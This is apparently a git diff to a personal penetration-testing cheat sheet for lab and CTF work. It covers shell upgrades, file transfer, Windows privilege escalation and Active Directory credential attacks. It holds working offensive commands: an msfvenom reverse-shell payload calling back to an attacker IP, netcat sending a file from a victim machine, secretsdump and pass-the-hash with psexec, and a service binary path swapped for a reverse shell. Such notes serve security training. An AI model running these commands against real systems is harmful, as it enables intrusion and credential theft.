@@ -14,19 +14,41 @@ ___
 ## Common tasks
 
 - Spawning TTY Shell: `python -c 'import pty; pty.spawn("/bin/bash")'`
-- Running an HTTP Server: `python3 -m http.server`
+	+ Upgrade shell:
+		* `export TERM=xterm` then `Ctrl + Z`
+		* Finally, `stty raw -echo; fg` 
+
+- Running an HTTP Server: `python3 -m http.server <PORT>`
+
+- Running an SMB server: `python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`
+	+ (Windows) Copy file from SMB server: 
+
+		```cmd
+		copy \\<IP>\kali\<filename> C:\Temp\<filename>
+		```
+
+- Generating a reverse shell executable (Windows): 
+
+	```bash
+	msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f exe -o reverse-shell.exe
+	```
+
 - Password "cracking": `hashcat -m $ATTACK_MODE $FILE /usr/share/wordlists/rockyou.txt`
 	+ `-r /usr/share/hashcat/rules/best64.rule` (Rule-based Attack)
+
 - Transfering file using **netcat**:	
 	+ Attacker's machine:
-	```bash
-	$ nc -l -p $LPORT  > $RFILE < /dev/null
-	^C
-	```
+
+		```bash
+		$ nc -l -p $LPORT  > $RFILE < /dev/null
+		^C
+		```
+
 	+ Victim's machine:
-	```bash
-	$ cat $LFILE | nc $RHOST $RPORT
-	```
+	
+		```bash
+		$ cat $LFILE | nc $RHOST $RPORT
+		```
 
 ## Common services/ports
 
@@ -34,7 +56,7 @@ ___
 
 `ftp $TARGET`
 
-- [ ] Check if you can log in as `annonymous`
+- Check if you can log in as `annonymous`
 
 ### Port 22 (SSH)
 
@@ -151,11 +173,16 @@ ___
 
 - [VbScrub - Tutorials](https://www.youtube.com/playlist?list=PL3B8L-z5QU-Yw80HOGXXUASBfv_K1WwO5)
 
-### Tools
+### Port 135 (RPC)
 
-- [nishang](https://github.com/samratashok/nishang): collection of scripts and payloads which enables usage of PowerShell for offensive security
-- [dnSpy](https://github.com/0xd4d/dnSpy#dnspy---latest-release---%EF%B8%8F-donate): debugger and .NET assembly editor.
-- [BloodHound](https://github.com/BloodHoundAD/Bloodhound/wiki): reveal the hidden and often unintended relationships within an Active Directory environment. 
+```bash
+rpcclient -U "" $IP
+<empty password>
+rpcclient $> srvinfo       # identify the specific OS version
+rpcclient $> enumdomusers  # display a list of users names defined on the server
+rpcclient $> getdompwinfo  # get SMB password policy
+rpcclient $> querydispinfo # get users info
+```
 
 ### Downloading files (alternative to `wget`)
 
@@ -182,27 +209,116 @@ powershell -command "(new-object System.Net.WebClient).DownloadFile('http://$IP:
 - `python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py <distinguishedName>/<username> -request -dc-ip <IP> [-no-pass -usersfile users.txt]`
 - Kerberos 5 AS-REP etype 23 `hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`. See [hashcat wiki](https://hashcat.net/wiki/doku.php?id=hashcat) and [**hackndo** - kerberos as-rep roasting (fr)](https://beta.hackndo.com/kerberos-asrep-roasting/)
 
-### Privesc
+___
 
 > _`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`_
 
 1. `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc-ntlm <domainName>/<admin-user>@<IP>`
 2. `python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes <NTLMhash> administrator@<IP> cmd.exe`
 
-### Port 135 (RPC)
+___
 
-```bash
-rpcclient -U "" $IP
-<empty password>
-rpcclient $> srvinfo       # identify the specific OS version
-rpcclient $> enumdomusers  # display a list of users names defined on the server
-rpcclient $> getdompwinfo  # get SMB password policy
-rpcclient $> querydispinfo # get users info
-```
+### Privesc
 
-### Post-exploitation
+> [Windows Privesc notes](https://github.com/amirr0r/notes/blob/master/Windows/Privesc.md)
 
-#### Tools
+- Look at your privileges: `woami /priv` (<https://github.com/hatRiot/token-priv>)
+	+ **SeImpersonatePrivilege**: impersonate any access tokens which it can obtain (Exploit: [Juicy Potato](https://github.com/ohpe/juicy-potato))
+	+ **SeAssignPrimaryPrivilege**: assign an access token to a new process. (Exploit: [Juicy Potato](https://github.com/ohpe/juicy-potato))
+	+ **SeBackupPrivilege**: grants **read** access to all objects on the system, regardless of their ACL.
+	+ **SeRestorePrivilege**: grants writeaccess to all objects on the system, regardless of their ACL.
+	+ **SeTakeOwnershipPrivilege**: lets the user take ownership over an object (the `WRITE_OWNER` permission).
+	+ More advanced:
+		* SeTcbPrivilege
+		* SeCreateTokenPrivilege
+		* SeLoadDriverPrivilege
+		* SeDebugPrivilege (used by `getsystem` => metasploit)
+
+- Kernel exploits: `systeminfo` + Windows exploit suggester
+- Exploit service:
+	+ querying the current status of a service:
+
+		```cmd
+		sc.exe query <name>
+		```
+	
+	+ starting/stopping a service:
+
+		```cmd
+		net start/stop <name>
+		```
+	
+
+	+ querying the configuration of a service:
+
+		```cmd
+		sc.exe qc <name>
+		```
+
+	+ Check our permissions ([accesschk.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) is part of **Windows Sysinternals**):
+
+		* On a specific service => (look for `SERVICE_CHANGE_CONFIG` or `SERVICE_ALL_ACCESS`):
+
+			```cmd
+			.\accesschk.exe /accepteula -uwcqv user <service name>
+			.\accesschk.exe /accepteula -ucqv user <service name>
+			```
+	
+		* On a specific service executable:
+
+			```cmd
+			.\accesschk.exe /accepteula -quvw user <service exe>
+			```
+	
+		* On a specific directory (look for **Unquoted Service Path**):
+
+			```cmd
+			.\accesschk.exe /accepteula -uwdq "C:"
+			```
+		
+		* On a specific registry:
+
+			```cmd
+			.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<service_name>
+			```
+
+	+ modifying a configuration option of a service:
+
+		```cmd
+		sc.exe config <name> <option>= <value>
+		```
+
+		* Example: changing `BINARY_PATH_NAME`:
+
+			```
+			sc config daclsvc binpath= "\"C:\PrivEsc\reverse-shell.exe\""
+			```
+
+- Look for passwords:
+	+ `dir/s *pass* == *.config`
+	+ `findstr /si password *.xml *.ini *.txt`
+	+ SAM and SYSTEM files in:
+		* `C:\Windows\Repair`
+		* `C:\Windows\System32\config\RegBack`
+		
+		> Copy them to Kali and crack them using `hashcat` or just pass the hash 
+
+- Look for saved credentials: `cmdkey /list`
+	+ `runas /savecred /user:admin C:\PrivEsc\reverse.exe`
+
+- Check scheduled tasks:
+	+ `schtasks /query /fo LIST /v`
+	+ PowerShell equivalent: 
+		```powershell
+		PS> Get-ScheduledTask| where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+		```
+
+### Tools/links
+
+- [nishang](https://github.com/samratashok/nishang): collection of scripts and payloads which enables usage of PowerShell for offensive security
+- [dnSpy](https://github.com/0xd4d/dnSpy#dnspy---latest-release---%EF%B8%8F-donate): debugger and .NET assembly editor.
+- [BloodHound](https://github.com/BloodHoundAD/Bloodhound/wiki): reveal the hidden and often unintended relationships within an Active Directory environment. 
+- [Gist - Windows Privilege Escalation](https://gist.github.com/sckalath/8dacd032b65404ef7411)
 
 - [LOLBAS](https://lolbas-project.github.io/#)
 	+ [GTFOBLookup](https://github.com/nccgroup/GTFOBLookup): offline command line lookup utility
@@ -219,6 +335,8 @@ ___
 
 ## Linux
 
+> [Linux Privesc notes](https://github.com/amirr0r/notes/blob/master/Linux/Privesc.md#privesc)
+
 `sudo -l`
 
 > **TODO**...
@@ -228,3 +346,10 @@ ___
 - [GTFOBins](https://gtfobins.github.io/)
 - [PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite#peass---privilege-escalation-awesome-scripts-suite)
 	+ [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+
+___
+
+## Useful links
+
+- [ swisskyrepo - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/)
+- [THM - What The Shell? (WU)](https://github.com/amirr0r/thm/tree/master/what-the-shell)
